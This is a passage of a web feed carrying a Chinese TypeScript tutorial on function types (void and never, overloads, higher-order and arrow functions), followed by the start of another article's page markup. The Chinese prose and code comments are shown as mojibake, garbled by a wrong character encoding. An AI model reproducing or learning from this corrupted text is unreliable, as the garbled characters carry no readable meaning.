  <span class="hljs-comment">// arr.push(4); //  æŠ¥é”™ï¼šreadonlyæ•°ç»„ä¸èƒ½è°ƒç”¨push</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr);
}

<span class="hljs-title function_">printArr</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">//  æ­£ç¡®</span>

<span class="hljs-comment">// çº¦æŸå¯¹è±¡å‚æ•°çš„å±æ€§ä¸ºåªè¯»</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">printObj</span>(<span class="hljs-params">obj: { <span class="hljs-keyword">readonly</span> name: <span class="hljs-built_in">string</span> }</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// obj.name = "æå››"; //  æŠ¥é”™ï¼šnameæ˜¯åªè¯»å±æ€§</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>);
}
</code></pre>
<h3 data-id="heading-10">ä¸‰ã€è¿”å›å€¼è¿›é˜¶ï¼švoidç±»å‹ä¸neverç±»å‹</h3>
<p>TSå¯¹å‡½æ•°è¿”å›å€¼çš„çº¦æŸä¸æ­¢åŸºç¡€ç±»å‹ï¼Œ<code>void</code> å’Œ <code>never</code> æ˜¯ä¸¤ä¸ªç‰¹æ®Šä¸”å¸¸ç”¨çš„è¿”å›å€¼ç±»å‹ã€‚</p>
<h4 data-id="heading-11">1. voidç±»å‹ï¼šæ— è¿”å›å€¼</h4>
<p>å‡½æ•°æ²¡æœ‰returnï¼ˆæˆ–return undefinedï¼‰æ—¶ï¼Œè¿”å›å€¼ç±»å‹ä¸º <code>void</code>ï¼Œè¡¨ç¤ºâ€œæ— ä»»ä½•è¿”å›å€¼â€ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// çº¯æ‰“å°å‡½æ•°ï¼Œæ— è¿”å›å€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg);
  <span class="hljs-comment">// return undefined; // å¯é€‰ï¼Œvoidå…è®¸è¿”å›undefined</span>
}

<span class="hljs-keyword">const</span> res = <span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello TS"</span>); <span class="hljs-comment">// resçš„ç±»å‹ä¸ºvoid</span>
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼š<code>void</code> ä¸æ˜¯ <code>undefined</code>â€”â€”<code>void</code> è¡¨ç¤ºâ€œå‡½æ•°æ— è¿”å›å€¼â€ï¼Œè€Œ <code>undefined</code> æ˜¯ä¸€ä¸ªå…·ä½“çš„å€¼ï¼›ä½†å‡½æ•°è¿”å› <code>undefined</code> æ—¶ï¼Œå¯èµ‹å€¼ç»™ <code>void</code> ç±»å‹å˜é‡ã€‚</p>
<h4 data-id="heading-12">2. neverç±»å‹ï¼šæ°¸ä¸è¿”å›</h4>
<p>å‡½æ•°æ°¸è¿œä¸ä¼šæ‰§è¡Œå®Œï¼ˆæŠ›å‡ºé”™è¯¯ã€æ— é™å¾ªç¯ï¼‰æ—¶ï¼Œè¿”å›å€¼ç±»å‹ä¸º <code>never</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åœºæ™¯1ï¼šæŠ›å‡ºé”™è¯¯çš„å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params">msg: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg); <span class="hljs-comment">// å‡½æ•°æ‰§è¡Œåˆ°è¿™é‡Œç»ˆæ­¢ï¼Œæ°¸ä¸è¿”å›</span>
}

<span class="hljs-comment">// åœºæ™¯2ï¼šæ— é™å¾ªç¯çš„å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {} <span class="hljs-comment">// æ°¸è¿œä¸ä¼šé€€å‡ºå¾ªç¯</span>
}

<span class="hljs-comment">// åœºæ™¯3ï¼šç©·å°½æ£€æŸ¥ï¼ˆç¡®ä¿switchè¦†ç›–æ‰€æœ‰æƒ…å†µï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-string">"success"</span> | <span class="hljs-string">"error"</span> | <span class="hljs-string">"pending"</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleStatus</span>(<span class="hljs-params">status: Status</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">switch</span> (status) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"success"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆåŠŸ"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"error"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¤±è´¥"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">"pending"</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŠ è½½ä¸­"</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-attr">default</span>:
      <span class="hljs-comment">// è‹¥æ¼å†™caseï¼Œè¿™é‡Œä¼šæç¤ºï¼šstatusç±»å‹ä¸ºneverï¼Œæ— æ³•èµ‹å€¼</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">_exhaustiveCheck</span>: <span class="hljs-built_in">never</span> = status;
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`æœªçŸ¥çŠ¶æ€ï¼š<span class="hljs-subst">${_exhaustiveCheck}</span>`</span>);
  }
}
</code></pre>
<h3 data-id="heading-13">å››ã€å‡½æ•°å†…çš„å±€éƒ¨ç±»å‹</h3>
<p>TSå…è®¸åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰ç±»å‹ï¼ˆå±€éƒ¨ç±»å‹ï¼‰ï¼Œä½œç”¨åŸŸä»…é™å‡½æ•°å†…éƒ¨ï¼Œé¿å…å…¨å±€ç±»å‹æ±¡æŸ“ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// å‡½æ•°å†…çš„å±€éƒ¨ç±»å‹ï¼Œå¤–éƒ¨æ— æ³•è®¿é—®</span>
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
  
  <span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user);
}

<span class="hljs-title function_">handleUser</span>();
<span class="hljs-comment">// const u: User = { name: "æå››", age: 30 }; // æŠ¥é”™ï¼šUseræœªå®šä¹‰</span>
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç±»å‹ä»…åœ¨å½“å‰å‡½æ•°å†…ä½¿ç”¨ï¼Œæ— éœ€æš´éœ²åˆ°å…¨å±€ï¼Œæå‡ä»£ç å°è£…æ€§ã€‚</p>
<h3 data-id="heading-14">äº”ã€é«˜é˜¶å‡½æ•°ï¼šå‡½æ•°ä½œä¸ºå‚æ•°/è¿”å›å€¼</h3>
<p>é«˜é˜¶å‡½æ•°æ˜¯â€œæ¥æ”¶å‡½æ•°ä½œä¸ºå‚æ•°â€æˆ–â€œè¿”å›å‡½æ•°â€çš„å‡½æ•°ï¼ŒTSå¯¹é«˜é˜¶å‡½æ•°çš„ç±»å‹çº¦æŸæ˜¯è¿›é˜¶é‡ç‚¹ã€‚</p>
<h4 data-id="heading-15">1. å‡½æ•°ä½œä¸ºå‚æ•°</h4>
<p>æœ€å¸¸è§çš„åœºæ™¯ï¼ˆå¦‚æ•°ç»„çš„map/filterï¼‰ï¼Œç”¨å‡½æ•°ç±»å‹è¡¨è¾¾å¼çº¦æŸå…¥å‚å‡½æ•°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰é«˜é˜¶å‡½æ•°ï¼šæ¥æ”¶æ•°ç»„å’Œå¤„ç†å‡½æ•°ï¼Œè¿”å›æ–°æ•°ç»„</span>
<span class="hljs-keyword">function</span> mapArr&lt;T, U&gt;(<span class="hljs-attr">arr</span>: T[], <span class="hljs-attr">handler</span>: <span class="hljs-function">(<span class="hljs-params">item: T</span>) =&gt;</span> U): U[] {
  <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">map</span>(handler);
}

<span class="hljs-comment">// ä½¿ç”¨ï¼šTSè‡ªåŠ¨æ¨å¯¼ç±»å‹</span>
<span class="hljs-keyword">const</span> nums = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> strNums = <span class="hljs-title function_">mapArr</span>(nums, <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// strNums: string[]</span>
<span class="hljs-keyword">const</span> doubles = <span class="hljs-title function_">mapArr</span>(nums, <span class="hljs-function">(<span class="hljs-params">n</span>) =&gt;</span> n * <span class="hljs-number">2</span>); <span class="hljs-comment">// doubles: number[]</span>
</code></pre>
<h4 data-id="heading-16">2. å‡½æ•°ä½œä¸ºè¿”å›å€¼</h4>
<p>è¿”å›å‡½æ•°æ—¶ï¼Œç”¨å‡½æ•°ç±»å‹è¡¨è¾¾å¼çº¦æŸè¿”å›å€¼çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// é«˜é˜¶å‡½æ•°ï¼šè¿”å›ä¸€ä¸ªåŠ æ³•å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createAddFunc</span>(<span class="hljs-params">num: <span class="hljs-built_in">number</span></span>): <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> x + num;
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> add5 = <span class="hljs-title function_">createAddFunc</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> res = <span class="hljs-title function_">add5</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// res: numberï¼Œå€¼ä¸º15</span>
</code></pre>
<h3 data-id="heading-17">å…­ã€å‡½æ•°é‡è½½ï¼šå¤„ç†å¤šç±»å‹å…¥å‚/è¿”å›å€¼</h3>
<p>å½“å‡½æ•°éœ€è¦æ”¯æŒâ€œä¸åŒå‚æ•°ç±»å‹/æ•°é‡ â†’ ä¸åŒè¿”å›å€¼ç±»å‹â€æ—¶ï¼Œç”¨<strong>å‡½æ•°é‡è½½</strong>å®ç°ç²¾å‡†çº¦æŸï¼ˆé¿å…è”åˆç±»å‹çš„æ¨¡ç³Šæ€§ï¼‰ã€‚</p>
<h4 data-id="heading-18">1. å‡½æ•°é‡è½½çš„åŸºç¡€å†™æ³•</h4>
<p>å…ˆå†™â€œé‡è½½ç­¾åâ€ï¼ˆå®šä¹‰å‚æ•°-è¿”å›å€¼çš„å¯¹åº”å…³ç³»ï¼‰ï¼Œå†å†™â€œå®ç°ç­¾åâ€ï¼ˆå®é™…é€»è¾‘ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ­¥éª¤1ï¼šå®šä¹‰é‡è½½ç­¾åï¼ˆå¯å†™å¤šä¸ªï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>; <span class="hljs-comment">// å…¥å‚string â†’ è¿”å›string</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>[]; <span class="hljs-comment">// å…¥å‚number â†’ è¿”å›number[]</span>

<span class="hljs-comment">// æ­¥éª¤2ï¼šå®šä¹‰å®ç°ç­¾å</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatData</span>(<span class="hljs-params">data: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>[] {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data === <span class="hljs-string">"string"</span>) {
    <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">toUpperCase</span>(); <span class="hljs-comment">// åŒ¹é…ç¬¬ä¸€ä¸ªé‡è½½</span>
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-title class_">String</span>(data), <span class="hljs-title class_">Number</span>); <span class="hljs-comment">// åŒ¹é…ç¬¬äºŒä¸ªé‡è½½</span>
  }
}

<span class="hljs-comment">// è°ƒç”¨ï¼šTSè‡ªåŠ¨æ¨å¯¼è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">const</span> strRes = <span class="hljs-title function_">formatData</span>(<span class="hljs-string">"ts"</span>); <span class="hljs-comment">// strRes: string</span>
<span class="hljs-keyword">const</span> numRes = <span class="hljs-title function_">formatData</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// numRes: number[]</span>
<span class="hljs-comment">// formatData(true); // æŠ¥é”™ï¼šæ— åŒ¹é…çš„é‡è½½ç­¾å</span>
</code></pre>
<h4 data-id="heading-19">2. å‡½æ•°é‡è½½çš„æ³¨æ„äº‹é¡¹</h4>
<ul>
<li>é‡è½½ç­¾ååªç”¨äºç±»å‹æ£€æŸ¥ï¼Œä¸ä¼šæ‰§è¡Œï¼Œé€»è¾‘å…¨éƒ¨å†™åœ¨å®ç°ç­¾åä¸­ï¼›</li>
<li>å®ç°ç­¾åçš„å‚æ•°ç±»å‹éœ€åŒ…å«æ‰€æœ‰é‡è½½ç­¾åçš„å‚æ•°ç±»å‹ï¼›</li>
<li>é¿å…è¿‡åº¦é‡è½½ï¼šç®€å•åœºæ™¯ç”¨è”åˆç±»å‹å³å¯ï¼Œé‡è½½é€‚åˆâ€œå‚æ•°å’Œè¿”å›å€¼å¼ºå…³è”â€çš„åœºæ™¯ã€‚</li>
</ul>
<h3 data-id="heading-20">ä¸ƒã€ç®­å¤´å‡½æ•°çš„ç±»å‹çº¦æŸ</h3>
<p>ç®­å¤´å‡½æ•°æ˜¯TSä¸­æœ€å¸¸ç”¨çš„å‡½æ•°å½¢å¼ï¼Œå…¶ç±»å‹çº¦æŸæ›´ç®€æ´ï¼Œä¸”æ— éœ€å¤„ç†thisæŒ‡å‘é—®é¢˜ã€‚</p>
<h4 data-id="heading-21">1. ç®­å¤´å‡½æ•°çš„åŸºç¡€ç±»å‹çº¦æŸ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼1ï¼šç›´æ¥çº¦æŸå‚æ•°å’Œè¿”å›å€¼</span>
<span class="hljs-keyword">const</span> add = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a + b;

<span class="hljs-comment">// æ–¹å¼2ï¼šç”¨ç±»å‹åˆ«åçº¦æŸï¼ˆå¤ç”¨åœºæ™¯ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">add2</span>: <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;
</code></pre>
<h4 data-id="heading-22">2. ç®­å¤´å‡½æ•°çš„thisæŒ‡å‘ï¼ˆæ— éœ€çº¦æŸï¼‰</h4>
<p>ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„thisï¼Œä¼šç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„thisï¼ŒTSä¼šè‡ªåŠ¨æ¨å¯¼ï¼Œæ— éœ€æ‰‹åŠ¨çº¦æŸï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> user = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"æå››"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,
  <span class="hljs-comment">// ç®­å¤´å‡½æ•°çš„thisç»§æ‰¿è‡ªå¤–å±‚ï¼ˆéä¸¥æ ¼æ¨¡å¼ä¸‹æ˜¯windowï¼‰</span>
  <span class="hljs-attr">sayHi</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// TSæç¤ºï¼šthisä¸Šä¸å­˜åœ¨nameå±æ€§</span>
  },
  <span class="hljs-comment">// æ™®é€šå‡½æ•°çš„thisæŒ‡å‘userå®ä¾‹</span>
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// æ­£ç¡®ï¼ŒthisæŒ‡å‘user</span>
  },
};
</code></pre>
<h3 data-id="heading-23">å…«ã€å®æˆ˜é¿å‘æŒ‡å—</h3>
<h4 data-id="heading-24">1. é¿å…ç”¨anyå¼±åŒ–å‡½æ•°ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  é”™è¯¯ï¼šanyå¯¼è‡´ç±»å‹æ£€æŸ¥å¤±æ•ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>): <span class="hljs-built_in">any</span> {
  <span class="hljs-keyword">return</span> data;
}

<span class="hljs-comment">//  æ­£ç¡®ï¼šç”¨æ³›å‹æ›¿ä»£any</span>
<span class="hljs-keyword">function</span> handleData&lt;T&gt;(<span class="hljs-attr">data</span>: T): T {
  <span class="hljs-keyword">return</span> data;
}
</code></pre>
<h4 data-id="heading-25">2. å¯é€‰å‚æ•°å¿…é¡»æ”¾åœ¨å¿…é€‰å‚æ•°å</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šå¯é€‰å‚æ•°ä¸èƒ½åœ¨å¿…é€‰å‚æ•°å‰</span>
<span class="hljs-comment">// function fn(a?: number, b: string): void {}</span>

<span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">b: <span class="hljs-built_in">string</span>, a?: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">void</span> {}
</code></pre>
<h4 data-id="heading-26">3. restå‚æ•°åªèƒ½æœ‰ä¸€ä¸ªä¸”æ”¾æœ€å</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šrestå‚æ•°å¿…é¡»æ˜¯æœ€åä¸€ä¸ª</span>
<span class="hljs-comment">// function fn(...nums: number[], a: string): void {}</span>

<span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span>, ...nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">void</span> {}
</code></pre>
<h4 data-id="heading-27">4. é‡è½½ç­¾åä¸å®ç°ç­¾åè¦å…¼å®¹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//  æŠ¥é”™ï¼šå®ç°ç­¾åçš„è¿”å›å€¼ä¸å…¼å®¹é‡è½½ç­¾å</span>
<span class="hljs-comment">// function fn(a: string): string;</span>
<span class="hljs-comment">// function fn(a: number): number;</span>
<span class="hljs-comment">// function fn(a: string | number): string { ... }</span>

<span class="hljs-comment">//  æ­£ç¡®ï¼šå®ç°ç­¾åè¿”å›å€¼åŒ…å«æ‰€æœ‰é‡è½½è¿”å›å€¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">a: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> { ... }
</code></pre>
<h3 data-id="heading-28">ä¹ã€æ ¸å¿ƒæ€»ç»“</h3>
<ol>
<li>å‡½æ•°ç±»å‹æè¿°ï¼šä¼˜å…ˆç”¨ã€Œå‡½æ•°ç±»å‹è¡¨è¾¾å¼ã€ï¼Œé¿å…å®½æ³›çš„<code>Function</code>ç±»å‹ï¼›</li>
<li>å‚æ•°çº¦æŸï¼šæŒæ¡å¯é€‰å‚æ•°ï¼ˆ?ï¼‰ã€é»˜è®¤å€¼ã€è§£æ„ã€restå‚æ•°ã€readonlyå‚æ•°ï¼Œè¦†ç›–æ‰€æœ‰å‚æ•°åœºæ™¯ï¼›</li>
<li>è¿”å›å€¼çº¦æŸï¼š<code>void</code>è¡¨ç¤ºæ— è¿”å›å€¼ï¼Œ<code>never</code>è¡¨ç¤ºæ°¸ä¸è¿”å›ï¼ˆå¸¸ç”¨äºé”™è¯¯/å¾ªç¯ï¼‰ï¼›</li>
<li>è¿›é˜¶ç‰¹æ€§ï¼šå±€éƒ¨ç±»å‹æå‡å°è£…æ€§ï¼Œé«˜é˜¶å‡½æ•°ç”¨æ³›å‹çº¦æŸå‚æ•°/è¿”å›å€¼ï¼Œé‡è½½é€‚é…å¤šç±»å‹å…¥å‚ï¼›</li>
<li>é¿å‘æ ¸å¿ƒï¼šä¸ç”¨anyå¼±åŒ–ç±»å‹ï¼Œå‚æ•°ä½ç½®ï¼ˆå¯é€‰/restï¼‰éµå®ˆè§„åˆ™ï¼Œé‡è½½ç­¾åä¸å®ç°ç­¾åå…¼å®¹ã€‚</li>
</ol>
<p>æŒæ¡è¿™äº›çŸ¥è¯†ç‚¹ï¼Œä½ çš„TSå‡½æ•°ç±»å‹çº¦æŸä¼šæ—¢ç²¾å‡†åˆçµæ´»ï¼Œå½»åº•å‘Šåˆ«â€œå‡½æ•°ç±»å‹æŠ¥é”™å´æ‰¾ä¸åˆ°åŸå› â€çš„é—®é¢˜ï½</p>
<pre><code class="hljs"/></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜]]></title>    <link>https://juejin.cn/post/7592455394062254118</link>    <guid>https://juejin.cn/post/7592455394062254118</guid>    <pubDate>2026-01-07T12:52:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592455394062254118" data-draft-id="7592079304923414538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-07T12:52:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="donecoding"/> <meta itemprop="url" content="https://juejin.cn/user/3192637500430093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ« scrollIntoView çš„â€œè¶Šçº§æ»šåŠ¨â€ï¼šä¸€è¡Œä»£ç è§£å†³æ¨ªå‘æ»šåŠ¨é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3192637500430093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    donecoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T12:52:03.000Z" title="Wed Jan 07 2026 12:52:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body 